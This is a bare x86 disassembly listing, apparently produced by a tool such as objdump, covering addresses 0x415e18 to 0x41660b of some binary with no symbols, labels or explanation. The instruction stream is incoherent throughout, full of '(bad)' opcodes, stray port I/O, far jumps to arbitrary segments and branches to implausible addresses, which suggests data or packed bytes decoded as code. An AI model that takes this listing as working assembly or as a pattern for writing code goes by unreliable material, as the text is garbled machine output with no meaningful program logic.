  415e18:	sbb    ch,BYTE PTR [ebx+0x7187437a]
  415e1e:	push   0x48
  415e20:	mov    DWORD PTR [esi],edi
  415e22:	fcmovnbe st,st(7)
  415e24:	adc    ch,BYTE PTR [esp+edi*1]
  415e27:	loopne 0x415e5d
  415e29:	inc    edx
  415e2a:	(bad)  
  415e2b:	adc    edx,edx
  415e2d:	sub    al,0x4
  415e2f:	loopne 0x415e9c
  415e31:	pop    ecx
  415e32:	sbb    DWORD PTR [ecx],0xa79d0507
  415e38:	les    esi,FWORD PTR [ecx+edi*8-0x6f]
  415e3c:	jno    0x415dc0
  415e3e:	mov    cl,0x4b
  415e40:	fs jmp 0x415dfe
  415e43:	cli    
  415e44:	daa    
  415e45:	(bad)  
  415e46:	sub    BYTE PTR [edx+0x61],ah
  415e49:	cmp    eax,0x51870aee
  415e4e:	adc    BYTE PTR [ebx],dh
  415e50:	pop    es
  415e51:	pop    eax
  415e52:	repnz scas al,BYTE PTR es:[edi]
  415e54:	adc    ecx,DWORD PTR [ebp+0xac70c3]
  415e5a:	mov    ah,BYTE PTR [esi+edx*1+0x1611b31d]
  415e61:	rcr    bh,cl
  415e63:	stos   DWORD PTR es:[edi],eax
  415e64:	pop    esp
  415e65:	jnp    0x415ece
  415e67:	dec    esi
  415e68:	adc    ecx,ebp
  415e6a:	gs pop esp
  415e6c:	pop    edi
  415e6d:	enter  0x292f,0xf0
  415e71:	dec    ebx
  415e72:	lods   al,BYTE PTR ds:[esi]
  415e73:	xchg   ecx,edx
  415e75:	lds    ebx,FWORD PTR [edx+ebp*4-0x75d187ba]
  415e7c:	mov    esp,0x51afa4c0
  415e81:	mov    ah,0x90
  415e83:	jb     0x415ea7
  415e85:	cli    
  415e86:	ins    DWORD PTR es:[edi],dx
  415e87:	add    ebx,DWORD PTR [ebx]
  415e89:	dec    edi
  415e8a:	lahf   
  415e8b:	lea    eax,[edi-0x15]
  415e8e:	fcomp  QWORD PTR [edi-0x4e]
  415e91:	in     eax,0x93
  415e93:	mov    esp,0x5214030a
  415e98:	outs   dx,BYTE PTR ds:[esi]
  415e99:	inc    ebx
  415e9a:	mov    ds:0x5a0f4ce,eax
  415e9f:	cmp    cl,BYTE PTR ds:0xe0c675c5
  415ea5:	xchg   edx,eax
  415ea6:	mov    edi,0x30e9b4f7
  415eab:	adc    al,0x32
  415ead:	sahf   
  415eae:	adc    BYTE PTR [edi],al
  415eb0:	xchg   esp,eax
  415eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb2:	daa    
  415eb3:	adc    BYTE PTR [ebx+0x5b28e0cb],0x62
  415eba:	jl     0x415e96
  415ebc:	sbb    cl,BYTE PTR [esi]
  415ebe:	xor    eax,0x7342d0eb
  415ec3:	jno    0x48f085b5
  415ec9:	push   ecx
  415eca:	jge    0x415f1f
  415ecc:	dec    ecx
  415ecd:	mov    cl,0xbe
  415ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed0:	and    al,0xd7
  415ed2:	jnp    0x415e91
  415ed4:	sub    al,0xe
  415ed6:	adc    al,0xe
  415ed8:	and    ch,BYTE PTR ds:0x9360a53
  415ede:	xor    cl,bh
  415ee0:	sbb    ah,bl
  415ee2:	push   ebx
  415ee3:	in     al,0x4b
  415ee5:	push   ebp
  415ee6:	push   ebx
  415ee7:	loop   0x415f29
  415ee9:	mov    ch,0x39
  415eec:	push   ebx
  415eed:	(bad)  
  415eef:	aas    
  415ef0:	je     0x415f1b
  415ef2:	call   0xdc53370
  415ef7:	fcom   QWORD PTR [edx+0x3c]
  415efa:	push   ds
  415efb:	xchg   ebx,eax
  415efc:	sub    al,0xad
  415efe:	std    
  415eff:	jmp    DWORD PTR [ebx-0x66a8dce1]
  415f05:	repz mov ecx,0x167686a2
  415f0b:	pop    edi
  415f0c:	dec    edi
  415f0d:	ret    
  415f0e:	dec    eax
  415f0f:	jecxz  0x415eae
  415f11:	or     al,dl
  415f13:	cmp    eax,0x88ffa911
  415f18:	rol    DWORD PTR [eax+0x58],0x6c
  415f1c:	rcl    dl,0x80
  415f1f:	pop    ebp
  415f20:	push   0x16241709
  415f25:	mov    dl,0xc0
  415f27:	inc    eax
  415f28:	add    ah,BYTE PTR [ecx-0x4d54628b]
  415f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f2f:	aas    
  415f30:	mov    bl,0x3e
  415f32:	jle    0x415f26
  415f34:	gs aad 0xd1
  415f37:	xchg   ebx,eax
  415f38:	xchg   esp,eax
  415f39:	repz mov ecx,0x79295b54
  415f3f:	add    al,0xc0
  415f41:	sub    eax,0x26aa2a00
  415f46:	fmul   QWORD PTR [eax+eax*1-0x9]
  415f4a:	pop    edi
  415f4b:	loopne 0x415f9d
  415f4d:	and    cl,BYTE PTR [edi]
  415f4f:	cs test al,0xde
  415f52:	mov    esi,0xa871be7d
  415f57:	mov    eax,ds:0x3eed2e4
  415f5c:	sub    DWORD PTR [ebp+0x3a],eax
  415f5f:	test   BYTE PTR [edx-0x4f85b770],ah
  415f65:	out    dx,al
  415f66:	push   edi
  415f67:	xchg   edi,eax
  415f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f69:	repnz adc cl,BYTE PTR [eax+0x4]
  415f6d:	mov    eax,esi
  415f6f:	mov    edi,0x1e957fe
  415f74:	lahf   
  415f75:	sub    eax,0x9b752dae
  415f7a:	push   ss
  415f7b:	test   eax,0x74468c19
  415f80:	in     eax,0xbf
  415f82:	mov    ebx,0x7782e08f
  415f87:	mov    DWORD PTR [eax],esi
  415f89:	mov    ch,0xc4
  415f8b:	sar    BYTE PTR [ebx-0x1f],cl
  415f8e:	cmp    DWORD PTR [esi],ebp
  415f90:	xchg   ecx,eax
  415f91:	int3   
  415f92:	cmp    BYTE PTR [eax-0x8],cl
  415f95:	and    DWORD PTR [ecx-0x806b959],ecx
  415f9b:	mov    eax,0x35321c28
  415fa0:	test   al,0xfc
  415fa2:	loop   0x415f30
  415fa4:	stos   DWORD PTR es:[edi],eax
  415fa5:	loope  0x415f9d
  415fa7:	loope  0x41600a
  415fa9:	(bad)  
  415faa:	jle    0x415f98
  415fac:	pop    ebx
  415fad:	xchg   esi,eax
  415fae:	or     al,0xaa
  415fb0:	sbb    al,0x2
  415fb2:	sub    ebx,DWORD PTR [ebp-0x224057b2]
  415fb8:	(bad)  
  415fba:	fbld   TBYTE PTR ds:0x7f0b9db
  415fc0:	loope  0x415fca
  415fc2:	xor    dh,BYTE PTR [esi-0x66]
  415fc5:	fwait
  415fc6:	jne    0x415fbf
  415fc8:	mov    fs,esp
  415fca:	test   eax,0x57f61f6c
  415fcf:	and    al,bh
  415fd1:	cmp    BYTE PTR [ecx+0x285760a9],cl
  415fd7:	leave  
  415fd8:	mov    eax,ds:0x355b6cc5
  415fdd:	jl     0x415f7f
  415fdf:	outs   dx,BYTE PTR ds:[esi]
  415fe0:	mov    ecx,0xba160eb2
  415fe5:	or     eax,0x431dcdcb
  415fea:	inc    esp
  415feb:	fidiv  DWORD PTR [edi+0x7d]
  415fee:	icebp  
  415fef:	arpl   WORD PTR [esi+0x5ab858fd],bp
  415ff5:	outs   dx,DWORD PTR ds:[esi]
  415ff6:	mov    ch,0x30
  415ff8:	sbb    DWORD PTR [ebp-0x4a34a187],edx
  415ffe:	outs   dx,DWORD PTR ss:[si]
  416001:	aad    0xc0
  416003:	enter  0xffd5,0x6e
  416007:	retf   
  416008:	cmp    al,0xdc
  41600a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41600b:	mov    edx,0xcc9566b1
  416010:	pop    esi
  416011:	cmp    al,0x51
  416013:	inc    eax
  416014:	push   esi
  416015:	lods   al,BYTE PTR ds:[esi]
  416016:	(bad)
  41601b:	cli    
  41601c:	(bad)  ds:0x14b75107
  416022:	mov    al,ds:0x8ca080be
  416027:	jp     0x416049
  416029:	(bad)  
  41602a:	out    0xea,eax
  41602c:	fsubr  QWORD PTR [edx]
  41602e:	es (bad) 
  416030:	fisubr DWORD PTR [edi+0xc2580bc]
  416036:	dec    ebx
  416037:	sti    
  416038:	cmp    DWORD PTR [ecx-0x4ee8a34d],esi
  41603e:	mov    esp,0x660a3d4a
  416043:	loop   0x415fdb
  416045:	mov    bl,0x58
  416047:	pushf  
  416048:	rcl    DWORD PTR [ecx+ebp*2],1
  41604b:	lea    edx,[edx-0x6]
  41604e:	xchg   esi,eax
  41604f:	cmp    BYTE PTR [ebp-0x47],ah
  416052:	inc    esi
  416053:	sub    eax,0x1f73c1f5
  416058:	mov    eax,ds:0x62df816c
  41605d:	mov    bh,0x34
  41605f:	fnstsw WORD PTR [edi+0x23]
  416062:	stos   BYTE PTR es:[edi],al
  416063:	add    cl,bh
  416065:	sub    ebx,ebp
  416067:	jb     0x416014
  416069:	out    0x2d,eax
  41606b:	outs   dx,BYTE PTR ds:[esi]
  41606c:	repnz rcr DWORD PTR [edx+0x20],0x77
  416071:	leave  
  416072:	popa   
  416073:	push   eax
  416074:	jl     0x416050
  416076:	iret   
  416077:	sahf   
  416078:	popa   
  416079:	and    edx,DWORD PTR [ebp+0x1d5c9755]
  41607f:	pushf  
  416080:	mov    ebx,0x753e356
  416085:	push   es
  416086:	push   ecx
  416087:	test   BYTE PTR [edi-0x70],ah
  41608a:	pushf  
  41608b:	hlt    
  41608c:	xchg   ebp,eax
  41608d:	pop    ecx
  41608e:	jp     0x41605c
  416090:	mov    ebx,0xf7dcdfb5
  416095:	out    0xb5,al
  416097:	shl    DWORD PTR [edx-0xe098e97],cl
  41609d:	xlat   BYTE PTR ds:[ebx]
  41609e:	add    DWORD PTR [edi+0x9],edi
  4160a1:	enter  0x2338,0xaf
  4160a5:	inc    ebx
  4160a6:	mov    ds:0xc479d56b,eax
  4160ab:	pop    ebp
  4160ac:	sub    DWORD PTR [esi+0x1c78c9f8],esp
  4160b2:	inc    esi
  4160b3:	mov    edx,0xb598dc16
  4160b8:	sub    al,dh
  4160ba:	aam    0xf7
  4160bc:	sbb    ch,BYTE PTR ds:0x13ecdfc
  4160c2:	adc    bh,BYTE PTR [ebp+0x20]
  4160c5:	fidiv  WORD PTR [ebx-0x1efb55eb]
  4160cb:	call   0x81c5:0xc46e3fd5
  4160d2:	mov    ds:0x3a32022b,al
  4160d7:	mov    DWORD PTR [eax+edi*4],eax
  4160da:	sbb    eax,0xf2c9fca9
  4160df:	and    al,0x8d
  4160e1:	push   ebp
  4160e2:	xchg   ebx,eax
  4160e3:	xchg   BYTE PTR [edi+0x5906612],bh
  4160e9:	icebp  
  4160ea:	inc    ebx
  4160eb:	mov    bh,0x62
  4160ed:	call   0xc5669766
  4160f2:	retf   
  4160f3:	adc    edi,DWORD PTR [eax]
  4160f5:	xlat   BYTE PTR ds:[ebx]
  4160f6:	loop   0x41610a
  4160f8:	jg     0x416106
  4160fa:	aaa    
  4160fb:	add    DWORD PTR [ebp+0x71],0x36
  4160ff:	pushf  
  416100:	data16 arpl WORD PTR [ebp+0x38e174cf],ax
  416107:	arpl   WORD PTR [eax+0x20],di
  41610a:	push   ds
  41610b:	lods   al,BYTE PTR ds:[esi]
  41610c:	sub    cl,BYTE PTR [ebp+0x2e5fc241]
  416112:	sahf   
  416113:	sbb    cl,BYTE PTR fs:[ebx+0x26]
  416117:	dec    ecx
  416118:	mov    ebp,DWORD PTR [ecx]
  41611a:	mov    ds:0x8eec382b,al
  41611f:	and    DWORD PTR [eax+0x40e38e2f],eax
  416125:	mov    ebx,ecx
  416127:	mov    dh,0x96
  416129:	xchg   esp,eax
  41612a:	call   0xcf05e6f2
  41612f:	mov    cl,0x23
  416131:	push   edi
  416132:	in     eax,0x9
  416134:	jno    0x41612f
  416136:	add    ebp,DWORD PTR [ebp-0x7c6a4826]
  41613c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41613d:	mov    ds:0x831122ed,al
  416142:	mov    eax,ds:0x48cd75e6
  416147:	mov    ah,0x92
  416149:	push   esp
  41614a:	test   eax,0x14d303c9
  41614f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416150:	push   ss
  416151:	adc    BYTE PTR [ebp+0x32],0x11
  416155:	js     0x416162
  416157:	pop    esi
  416158:	push   edx
  416159:	mov    eax,ds:0xf95b5579
  41615e:	xchg   esi,eax
  41615f:	adc    ebx,DWORD PTR [ebx+esi*4]
  416162:	and    dh,BYTE PTR [edi+0x31]
  416165:	das    
  416166:	call   0x8db5:0xcd87b698
  41616d:	ins    DWORD PTR es:[edi],dx
  41616e:	sub    ebx,eax
  416170:	mov    eax,ds:0x6f54439c
  416175:	adc    ch,ch
  416177:	xchg   ah,ah
  416179:	xor    al,0xca
  41617b:	stos   DWORD PTR es:[edi],eax
  41617c:	loopne 0x416127
  41617e:	fwait
  41617f:	inc    ebp
  416180:	into   
  416181:	cmp    al,0x7d
  416183:	ins    DWORD PTR es:[edi],dx
  416184:	sar    DWORD PTR [esi-0x13],1
  416187:	fdivr  QWORD PTR [edi+ebp*2]
  41618a:	stos   BYTE PTR es:[edi],al
  41618b:	pop    esp
  41618c:	push   cs
  41618d:	repz in eax,dx
  41618f:	fs iret 
  416191:	jg     0x416177
  416193:	add    cl,dh
  416195:	xor    al,BYTE PTR [ebp+0xf6f9a20]
  41619b:	(bad)  
  41619c:	in     al,0x54
  41619e:	pusha  
  41619f:	sub    BYTE PTR [esi-0x75],dl
  4161a2:	jge    0x41620a
  4161a4:	xchg   ebx,eax
  4161a5:	retf   0x8510
  4161a8:	jmp    0x4161bb
  4161aa:	or     BYTE PTR [edx-0x2c],cl
  4161ad:	sub    eax,0x75d441d
  4161b2:	dec    BYTE PTR [ebx+ebx*8]
  4161b5:	push   0x5f7ab7af
  4161ba:	ror    BYTE PTR [esi],cl
  4161bc:	jp     0x416140
  4161be:	dec    ebp
  4161bf:	cmp    ecx,esi
  4161c1:	mov    dl,0xfe
  4161c3:	or     cl,BYTE PTR [ecx-0x1c]
  4161c6:	fld    TBYTE PTR [ebx+edi*8-0x79]
  4161ca:	iret   
  4161cb:	mov    esi,0xf644b872
  4161d0:	fisub  DWORD PTR [ecx]
  4161d2:	ret    
  4161d3:	dec    ecx
  4161d4:	pop    ebp
  4161d5:	mov    ebx,0x8470e72
  4161da:	ret    
  4161db:	sbb    bl,BYTE PTR [esi-0x67466ba7]
  4161e1:	enter  0x70fc,0xb0
  4161e5:	xlat   BYTE PTR ds:[ebx]
  4161e6:	mov    cl,0x63
  4161e8:	sbb    BYTE PTR [esi+0x2a6c316e],al
  4161ee:	loopne 0x41620a
  4161f0:	jno    0x4161af
  4161f2:	add    al,0x4
  4161f4:	jne    0x4161d7
  4161f6:	repz ds dec ebp
  4161f9:	(bad)  
  4161fa:	int3   
  4161fb:	out    0xb6,al
  4161fd:	out    dx,eax
  4161fe:	(bad)  
  4161ff:	ss sti 
  416201:	jle    0x41619f
  416203:	mov    bl,0xdf
  416205:	lods   eax,DWORD PTR ds:[esi]
  416206:	sub    eax,0xfdc69f59
  41620b:	push   esi
  41620c:	xchg   ebx,eax
  41620d:	dec    edi
  41620e:	sbb    eax,0xab3e5666
  416213:	sub    BYTE PTR [esi-0x275b5116],0x5d
  41621a:	sar    edx,cl
  41621c:	aad    0xab
  41621e:	sbb    ch,cl
  416220:	mov    ds:0xaa14efab,eax
  416225:	adc    ch,bh
  416227:	cmp    eax,0x59156bb3
  41622c:	mov    edi,0x25205b18
  416231:	xor    al,0x64
  416233:	push   esi
  416234:	xor    DWORD PTR [edi+0x2331991d],eax
  41623a:	repnz nop
  41623c:	imul   edi,DWORD PTR [ecx],0xd7b51e0
  416242:	aas    
  416243:	test   al,0xf7
  416245:	retf   
  416246:	sbb    cl,al
  416248:	mov    ah,0x51
  41624a:	bound  ecx,QWORD PTR [eax-0x5a]
  41624d:	ficomp DWORD PTR ds:0xea409e7e
  416253:	test   eax,0x1cf03e37
  416258:	jo     0x416237
  41625a:	repnz pop edi
  41625c:	sbb    DWORD PTR [ecx],ebp
  41625e:	inc    esp
  41625f:	or     ebx,ecx
  416261:	push   es
  416262:	enter  0x6253,0x79
  416266:	mov    DWORD PTR [ebx-0x1a606a46],edi
  41626c:	ficom  WORD PTR [ebx-0x7485d606]
  416272:	fcom   DWORD PTR [edx]
  416274:	pop    esi
  416275:	push   0xd8d38c0
  41627a:	adc    al,0x26
  41627c:	xchg   edi,eax
  41627d:	push   0x1
  41627f:	or     BYTE PTR ds:0x48f09ea,ah
  416285:	fwait
  416286:	cld    
  416287:	or     bh,BYTE PTR [eax+0x332fb43e]
  41628d:	xchg   BYTE PTR [eax+0x51e257bd],dh
  416293:	pop    ecx
  416294:	int    0x1d
  416296:	das    
  416297:	mov    cl,0xa8
  416299:	dec    edx
  41629a:	scas   eax,DWORD PTR es:[edi]
  41629b:	mov    edi,0x410b89e2
  4162a0:	shl    BYTE PTR [esi-0x2],0xd9
  4162a4:	add    ch,BYTE PTR [ecx-0x75]
  4162a7:	pop    eax
  4162a8:	pushf  
  4162a9:	add    esp,esi
  4162ab:	push   DWORD PTR [ebx]
  4162ad:	mov    ds,WORD PTR [ecx-0x59bcf6f4]
  4162b3:	dec    esp
  4162b4:	(bad)  
  4162b5:	adc    BYTE PTR [edx+0x5f],bh
  4162b8:	push   esp
  4162b9:	rcl    BYTE PTR [edi],cl
  4162bb:	(bad)  
  4162bc:	aad    0x5a
  4162be:	repnz daa 
  4162c0:	hlt    
  4162c1:	mov    dl,0x14
  4162c3:	pop    esi
  4162c4:	bswap  ecx
  4162c6:	xchg   edx,eax
  4162c7:	in     al,dx
  4162c8:	push   ds
  4162c9:	loope  0x416263
  4162cb:	cmp    al,0xff
  4162cd:	or     al,0xfd
  4162cf:	repz push ecx
  4162d1:	clc    
  4162d2:	or     dl,BYTE PTR ds:0x3163fb7e
  4162d8:	les    esp,FWORD PTR [ecx]
  4162da:	into   
  4162db:	add    edx,DWORD PTR [edx+0x2b97d6d7]
  4162e1:	mov    fs,WORD PTR [ecx+0x4e694ae6]
  4162e7:	shl    BYTE PTR [ebp-0x14],cl
  4162ea:	nop
  4162eb:	not    BYTE PTR [edi]
  4162ed:	in     eax,dx
  4162ee:	imul   edx
  4162f0:	dec    esi
  4162f1:	or     ch,dh
  4162f3:	inc    esi
  4162f4:	add    al,0xf
  4162f6:	add    al,dh
  4162f8:	jne    0x416359
  4162fa:	addr16 cli 
  4162fc:	jnp    0x416359
  4162fe:	push   ebp
  4162ff:	cwde   
  416300:	jecxz  0x416322
  416302:	scas   al,BYTE PTR es:[edi]
  416303:	mov    bl,BYTE PTR [esp+esi*1-0x99b0282]
  41630a:	iret   
  41630b:	shl    DWORD PTR [esi],1
  41630d:	sbb    eax,0x28e7a111
  416312:	jmp    0x46df:0xec86b918
  416319:	mov    bl,0x1b
  41631b:	xor    eax,0xfe8fabe2
  416320:	daa    
  416321:	jns    0x416347
  416323:	mov    ds:0xf14e0f2c,eax
  416328:	(bad)  
  416329:	rcr    DWORD PTR [ecx-0x5834b888],cl
  41632f:	xchg   edi,eax
  416330:	cmpxchg BYTE PTR [esp+eax*2-0x413619b7],al
  416338:	retf   
  416339:	pop    eax
  41633a:	mov    al,0x78
  41633c:	and    bl,BYTE PTR [bp+si-0x6466]
  416341:	jae    0x4163be
  416343:	cmc    
  416344:	call   0x5484:0x79055769
  41634b:	xor    ecx,DWORD PTR [edx+0x1c2a5927]
  416351:	pop    es
  416352:	ja     0x416366
  416354:	adc    al,BYTE PTR [edi]
  416356:	stos   DWORD PTR es:[edi],eax
  416357:	push   ss
  416358:	fstp   QWORD PTR [ebp+edi*4+0x43]
  41635c:	call   FWORD PTR [edi+0x7b670496]
  416362:	add    ebp,esp
  416364:	jmp    0x2df28cba
  416369:	jb     0x416334
  41636b:	inc    edx
  41636c:	add    dl,BYTE PTR [esi-0x54]
  41636f:	test   eax,0x7b0e4d9b
  416374:	js     0x41632c
  416376:	icebp  
  416377:	cmp    BYTE PTR [edi],dh
  416379:	mov    ah,0x3
  41637b:	mov    dl,0x65
  41637d:	cld    
  41637e:	jne    0x4163ab
  416380:	test   eax,0xcfa03322
  416385:	push   ebp
  416386:	neg    DWORD PTR [ebx]
  416388:	(bad)  
  416389:	sbb    ebp,DWORD PTR [eax-0x3]
  41638c:	mov    esi,cs
  41638e:	loope  0x41635c
  416390:	inc    esp
  416391:	push   eax
  416392:	fild   QWORD PTR [edx+ecx*1]
  416395:	mov    dl,0x9c
  416397:	(bad)  
  416398:	or     BYTE PTR ds:[esi-0x55],dl
  41639c:	lods   eax,DWORD PTR ds:[esi]
  41639d:	ret    
  41639e:	or     BYTE PTR [eax],al
  4163a0:	mov    ah,0x8c
  4163a2:	jg     0x41641d
  4163a4:	(bad)  
  4163a5:	dec    eax
  4163a6:	mov    cl,0x32
  4163a8:	popf   
  4163a9:	rcr    DWORD PTR [ecx-0xb77040b],0x82
  4163b0:	dec    edx
  4163b1:	adc    BYTE PTR [ebx+0x27],cl
  4163b4:	or     eax,0xc2b44ea9
  4163b9:	jae    0x416355
  4163bb:	sub    al,0x23
  4163bd:	jb     0x416428
  4163bf:	mov    ds:0x6f6d36fd,eax
  4163c4:	xchg   ebp,eax
  4163c5:	stc    
  4163c6:	add    al,0x48
  4163c8:	pop    esp
  4163c9:	xor    al,0x9d
  4163cb:	loope  0x416367
  4163cd:	inc    ebp
  4163ce:	into   
  4163cf:	lock fs aam 0xb6
  4163d3:	xor    edi,edi
  4163d5:	ins    BYTE PTR es:[edi],dx
  4163d6:	ret    
  4163d7:	inc    DWORD PTR [ebp-0x64]
  4163da:	jae    0x4163c0
  4163dc:	test   DWORD PTR [eax-0x6d],0x4c70c4d0
  4163e3:	adc    al,0x44
  4163e5:	and    al,0xd7
  4163e7:	mov    al,0x3b
  4163e9:	mov    cl,0x65
  4163eb:	push   edx
  4163ec:	stos   BYTE PTR es:[edi],al
  4163ed:	neg    DWORD PTR ds:0x6ba7d0ab
  4163f3:	rcr    eax,0x64
  4163f6:	imul   ecx,DWORD PTR ds:0x8ff05e0,0x52
  4163fd:	mov    dl,0xf
  4163ff:	jbe    0x4163e7
  416401:	retf   
  416402:	pop    ecx
  416403:	mov    eax,ds:0x88eeb90c
  416408:	xor    BYTE PTR [edi-0x7bf795e],dh
  41640e:	(bad)  
  416410:	scas   eax,DWORD PTR es:[edi]
  416411:	outs   dx,BYTE PTR ds:[esi]
  416412:	jae    0x416476
  416414:	sbb    al,0x79
  416416:	inc    esi
  416417:	or     DWORD PTR [edi+0x5aea3890],esi
  41641d:	add    ecx,DWORD PTR [ebx+0x59ef7979]
  416423:	outs   dx,DWORD PTR ds:[esi]
  416424:	outs   dx,DWORD PTR ds:[esi]
  416425:	in     eax,dx
  416426:	mov    esp,0xca8058e2
  41642b:	shr    DWORD PTR [ebx],cl
  41642d:	pop    ds
  41642e:	xchg   ebp,eax
  41642f:	sbb    DWORD PTR [ebx-0x3ef0494b],edx
  416435:	cmp    BYTE PTR [eax+0x22],0xe4
  416439:	push   0x94f9fdd5
  41643e:	test   BYTE PTR [ebp+0x16b7d55a],ah
  416444:	fst    QWORD PTR [ebx-0x4816f35f]
  41644a:	add    BYTE PTR [ebp+edx*2-0x1224319e],dh
  416451:	das    
  416452:	fcmovne st,st(7)
  416454:	inc    ecx
  416455:	mov    bh,0x39
  416457:	mov    ds:0x71569083,al
  41645c:	pusha  
  41645d:	inc    ebx
  41645e:	add    BYTE PTR ds:0x97705f8a,al
  416464:	das    
  416465:	imul   eax,ecx,0xdf8050c0
  41646b:	and    BYTE PTR [esi*8-0x23299c5a],al
  416472:	inc    esi
  416473:	xlat   BYTE PTR ds:[ebx]
  416474:	push   ebx
  416475:	fld    st(6)
  416477:	enter  0x7f12,0x4f
  41647b:	test   BYTE PTR [esi-0x220aa2e5],0xc2
  416482:	xor    BYTE PTR [edx+0x49],bl
  416485:	addr16 clc 
  416487:	fmul   DWORD PTR [edi]
  416489:	xor    ch,cl
  41648b:	cmc    
  41648c:	arpl   bx,si
  41648e:	rcr    DWORD PTR [ebx],1
  416490:	mov    edi,0x4b7af031
  416495:	inc    edi
  416496:	fwait
  416497:	div    DWORD PTR [ebp+0x7951da20]
  41649d:	inc    esi
  41649e:	popf   
  41649f:	mov    eax,0x3a8e7f13
  4164a4:	adc    DWORD PTR [edx],ebx
  4164a6:	loopne 0x416444
  4164a8:	call   0xa1fc233e
  4164ad:	iret   
  4164ae:	xchg   esp,eax
  4164af:	jl     0x41648f
  4164b1:	xlat   BYTE PTR ds:[ebx]
  4164b2:	fld    TBYTE PTR [eax+ebx*4-0x5303c987]
  4164b9:	lods   al,BYTE PTR ds:[esi]
  4164ba:	cmp    eax,0x1d57b07a
  4164bf:	and    ebx,DWORD PTR [esi+0x54c6d17b]
  4164c5:	das    
  4164c6:	inc    ebx
  4164c7:	loope  0x4164c4
  4164c9:	mov    bh,BYTE PTR [edx]
  4164cb:	xchg   DWORD PTR [ebp+0x22],esi
  4164ce:	shl    BYTE PTR [ebx-0x7b],0x6
  4164d2:	mov    eax,0xe76b5e8b
  4164d7:	dec    esp
  4164d8:	push   0xffffffd8
  4164da:	aam    0x7d
  4164dc:	les    esp,FWORD PTR [edx-0x41]
  4164df:	inc    ebx
  4164e0:	mov    dl,0xb
  4164e2:	sub    bl,BYTE PTR [ecx+0x7b464067]
  4164e8:	addr16 pop ss
  4164ea:	shr    DWORD PTR [ebx-0x62f82b12],cl
  4164f0:	xchg   edx,eax
  4164f1:	jnp    0x416572
  4164f3:	jae    0x416501
  4164f5:	lds    ebx,FWORD PTR [edi-0x75]
  4164f8:	mov    ah,0xd
  4164fa:	adc    ecx,0x50
  4164fd:	inc    esi
  4164fe:	cld    
  4164ff:	push   eax
  416500:	(bad)  
  416501:	aas    
  416502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416503:	sbb    eax,0x992e927f
  416508:	push   0xffffffcc
  41650a:	dec    edi
  41650b:	fld    st(3)
  41650d:	clc    
  41650e:	das    
  41650f:	dec    edx
  416510:	neg    edx
  416512:	pop    esi
  416513:	xor    eax,0xee45385
  416518:	js     0x416551
  41651a:	ret    
  41651b:	bound  ebp,QWORD PTR [eax+0x277f6f6]
  416521:	cdq    
  416522:	pop    ss
  416523:	or     edx,DWORD PTR [edx-0x39]
  416526:	data16 out 0x91,al
  416529:	mov    ah,0xa4
  41652b:	or     BYTE PTR [esi+ebp*1-0x3e],dl
  41652f:	and    al,0xb3
  416531:	jno    0x416510
  416533:	xlat   BYTE PTR ds:[ebx]
  416534:	aas    
  416535:	enter  0x2f23,0xc5
  416539:	stc    
  41653a:	cs leave 
  41653c:	jb     0x4164d8
  41653e:	dec    edx
  41653f:	adc    al,0x37
  416541:	hlt    
  416542:	loope  0x41657c
  416544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416545:	in     al,0xe7
  416547:	lahf   
  416548:	mov    ds:0xa7b7f649,al
  41654d:	adc    dh,BYTE PTR [ecx-0xd]
  416550:	xor    BYTE PTR [eax-0x27d7a76c],ch
  416556:	dec    ebp
  416557:	cmp    DWORD PTR [eax],eax
  416559:	mov    ch,ah
  41655b:	out    dx,eax
  41655c:	ds mov al,0xa2
  41655f:	xchg   ebp,eax
  416560:	push   ds
  416561:	(bad)  
  416562:	adc    al,0x60
  416564:	ins    BYTE PTR es:[edi],dx
  416565:	push   ecx
  416566:	rcl    BYTE PTR [ecx],1
  416568:	xor    bh,al
  41656a:	jnp    0x4164fa
  41656c:	scas   al,BYTE PTR es:[edi]
  41656d:	add    ebx,DWORD PTR [eax]
  41656f:	mov    al,0xda
  416571:	aas    
  416572:	push   0xe5899ba8
  416577:	add    BYTE PTR [edx],al
  416579:	cwde   
  41657a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657b:	pop    eax
  41657c:	cmp    ecx,DWORD PTR [eax+0x1485f5a0]
  416582:	jne    0x416574
  416584:	dec    ebp
  416585:	mov    edx,0xc53a491f
  41658a:	jmp    0x1d008e00
  41658f:	push   ebx
  416590:	ins    BYTE PTR es:[edi],dx
  416591:	xchg   DWORD PTR [esi],esp
  416593:	aaa    
  416594:	dec    edi
  416595:	dec    eax
  416596:	cmp    ebp,ebx
  416598:	daa    
  416599:	jo     0x4165a6
  41659b:	in     eax,0x5d
  41659d:	mov    al,fs:0x531b54a9
  4165a3:	daa    
  4165a4:	retf   
  4165a5:	fs popa 
  4165a7:	cmp    eax,0x26f9cee5
  4165ac:	retf   
  4165ad:	std    
  4165ae:	mov    ch,0xe1
  4165b0:	ret    
  4165b1:	sar    DWORD PTR [eax],cl
  4165b3:	inc    esi
  4165b4:	imul   esp,esp,0x19987336
  4165ba:	and    BYTE PTR [edx+0x4203b0dd],bh
  4165c0:	rcr    DWORD PTR [edi+esi*4+0x7aec38c3],cl
  4165c7:	int3   
  4165c8:	mov    eax,ds:0xb0515833
  4165cd:	hlt    
  4165ce:	pop    edi
  4165cf:	add    eax,0x9d7411db
  4165d4:	or     eax,DWORD PTR [ebx+0x4c]
  4165d7:	scas   al,BYTE PTR es:[edi]
  4165d8:	popa   
  4165d9:	push   esi
  4165da:	addr16 dec esp
  4165dc:	clc    
  4165dd:	pop    ebx
  4165de:	jmp    0x6c2b:0x90fd3c3e
  4165e5:	pop    ebp
  4165e6:	mov    edi,0xdacb94bc
  4165eb:	push   0xadb7385b
  4165f0:	inc    ch
  4165f2:	inc    ecx
  4165f3:	xchg   DWORD PTR [ecx+0x1d5c7b98],ebx
  4165f9:	inc    esp
  4165fa:	rcl    DWORD PTR [ebx],1
  4165fc:	mov    eax,ds:0xb75cb582
  416601:	test   eax,0x662d69e8
  416606:	fstp   DWORD PTR [eax+0x78]
  416609:	ss icebp 
  41660b:	retf   0xe937
